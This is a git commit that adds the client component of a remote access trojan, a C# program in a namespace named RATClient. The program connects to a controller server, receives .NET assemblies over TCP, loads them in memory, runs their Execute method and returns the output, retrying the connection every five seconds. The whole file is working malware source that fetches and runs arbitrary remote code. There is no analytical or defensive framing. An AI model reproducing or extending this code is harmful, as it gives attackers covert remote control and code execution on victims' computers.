dd70aa75e3f6e550986bc6375274969c4b3dbf1d
Byte Wizard <122925084+BYT3W1Z4RD@users.noreply.github.com>
2023-04-14 14:26:36 +0100

    Add files via upload

---
+++ Client/Program.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.IO;
+using System.Net.Sockets;
+using System.Reflection;
+using System.Text;
+using System.Threading;
+
+namespace RATClient
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                try
+                {
+                    TcpClient client = new TcpClient("localhost", 8888);
+                    Console.WriteLine("[Connected to server]");
+                    while (true)
+                    {
+                        byte[] buffer = new byte[sizeof(int)];
+                        int bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
+                        int assemblyLength = BitConverter.ToInt32(buffer, 0);
+                        buffer = new byte[assemblyLength];
+                        bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
+                        Assembly assembly = Assembly.Load(buffer);
+                        foreach (Type type in assembly.GetExportedTypes())
+                        {
+                            MethodInfo method = type.GetMethod("Execute");
+                            if (method != null)
+                            {
+                                object instance = Activator.CreateInstance(type);
+                                object result = method.Invoke(instance, null);
+                                byte[] responseBytes = Encoding.ASCII.GetBytes(result.ToString());
+                                client.GetStream().Write(responseBytes, 0, responseBytes.Length);
+                                break;
+                            }
+                        }
+                    }
+                    client.Close();
+                }
+                catch (Exception)
+                {
+                    Console.WriteLine("\nReconnecting...");
+                    Thread.Sleep(5000);
+                }
+            }
+        }
+    }
+    public interface IPlugin
+    {
+        string Execute();
+    }
+}
